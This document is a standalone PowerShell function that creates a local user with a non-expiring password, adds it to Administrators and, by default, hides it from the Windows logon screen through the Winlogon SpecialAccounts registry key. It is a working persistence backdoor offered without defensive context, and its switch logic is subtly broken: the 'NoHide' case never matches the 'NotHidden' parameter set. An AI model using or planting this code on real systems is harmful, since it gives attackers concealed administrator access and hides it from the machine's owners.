function Add-User {
        [CmdletBinding(DefaultParameterSetName="Hidden")]
        Param(
            [Parameter(Mandatory=$True)]
            [String]$Username,

            [Parameter(Mandatory=$True)]
            [String]$Password,

            [Parameter(ParameterSetName="Hidden")]
            [Switch]$Hidden,

            [Parameter(ParameterSetName="NotHidden")]
            [Switch]$NoHide
            )

        Switch ($PsCmdlet.ParameterSetName){
            "Hidden"     { $Hidden = $True }
            "NoHide"     { $Hidden = $False }
            }

        $regPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"

        If ($PSVersionTable.PSVersion -lt "5.1"){
            Net User $Username $Password /Add | Out-Null
            Net Localgroup "Administrators" $Username /Add | Out-Null
            If ($Hidden -eq $False){ Exit }
            Reg Add "HKLM\$regPath\UserList" /v $Username /t REG_DWORD /d "0" /f | Out-Null
            }
        Else {
            $secPW = ConvertTo-SecureString -String $Password -AsPlainText -Force
            New-LocalUser -Name $Username -Password $secPw -PasswordNeverExpires -AccountNeverExpires | Out-Null
            Add-LocalGroupMember -Group "Administrators" -Member $Username | Out-Null
            If ($Hidden -eq $False){ Exit }
            If ( $(Test-Path -Path "HKLM:\$regPath\UserList") -eq $False ){
                New-Item -Path "HKLM:\$regPath" -Name "UserList" -Force | Out-Null
                }
            New-ItemProperty -Path "HKLM:\$regPath\UserList" -Name $Username -PropertyType "DWORD" -Value "0" -Force | Out-Null
            }
}
            